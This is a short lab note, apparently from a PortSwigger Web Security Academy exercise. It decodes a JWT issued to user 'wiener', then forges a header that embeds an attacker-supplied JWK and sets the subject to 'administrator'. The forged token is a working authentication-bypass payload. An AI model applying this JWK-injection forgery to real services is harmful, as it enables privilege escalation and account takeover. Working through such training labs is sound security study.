@@ -1,0 +1,36 @@
+Original JWT:
+    eyJraWQiOiI2YmZmYWQzZS0wYTA3LTRjMWYtYmU1Yi1lMmVjYzZmM2E1ZWIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNDEwMDE5NCwic3ViIjoid2llbmVyIn0.aOowuPgWD_POXsZIncVoiIhBSgdE22_l3k61c_GAMt5164rUU2sGs7sda9t5neGuW1lC3i65Ptf8siEIOUkqbgitYUzCy-VONy108ZGNZ0UI-9xspOKa-DouUCRSpyhiYrZ3qpMZG-SXAiQHYnnvDhb95nV7KEIzxNMeL7Dv7Mty1XEWLiu5cktNs9TucBTQQNpIJhMKIf_FOjDRuDliHf4zTGq28iESSAXkZhR2o4UK9X_ZvxwEw9WDiPtsE-r-18OPhTZH8X6_LqsOcKEdftcFFYvNtZT6G4KcglkbneRNtAIFv0ihOusZu1Yu8rQZAaj5DRSrlw_SKZgcWfPPLQ
+
+Decoded:
+    HEADERS: 
+    {
+        "kid":"6bffad3e-0a07-4c1f-be5b-e2ecc6f3a5eb",
+        "alg":"RS256"
+    }
+    PAYLOAD: 
+    {
+        "iss":"portswigger",
+        "exp":1734100194,
+        "sub":"wiener"
+    }
+
+Let's inject our JWK and change the "sub" field to "administrator"
+    HEADERS: 
+    {
+        "kid":"6bffad3e-0a07-4c1f-be5b-e2ecc6f3a5eb",
+        "alg":"RS256",
+        "jwk": {
+            "kty": "RSA",
+            "e": "AQAB",
+            "use": "sig",
+            "kid": "6bffad3e-0a07-4c1f-be5b-e2ecc6f3a5eb",
+            "alg": "RS256",
+            "n": "kHexYhO_REWYbmMMV0HTtKoexypEu_gLCdaGHrjWnl3nYOdyRyKUkPCaxzHBXd2cVoH70DYDWeIPINVMgjzZxLFGxQDopFzTD39tlQnj9InGRuROlqirKfPimP089556jqOzqVKaullReRMX0rY_lXDpjo8XwIx9OG4bphASyqNPMlkYHFVbt7IHpIiCCybMiEQr0aWeBdbNctf_cYedIbq62Ioirsa_NENRGbahvQQ1h2L4jBeqD56azNNQNHQXov_Jet9QE5uiIHAalfBV_E924jTGYzcgE3UMjQ7e56S1TiYk9IRA7xHeuKPW_e2dC22PynPSh6stEFStAzrKcw"
+        }
+    }
+    PAYLOAD: 
+    {
+        "iss":"portswigger",
+        "exp":1734100194,
+        "sub":"administrator"
+    }
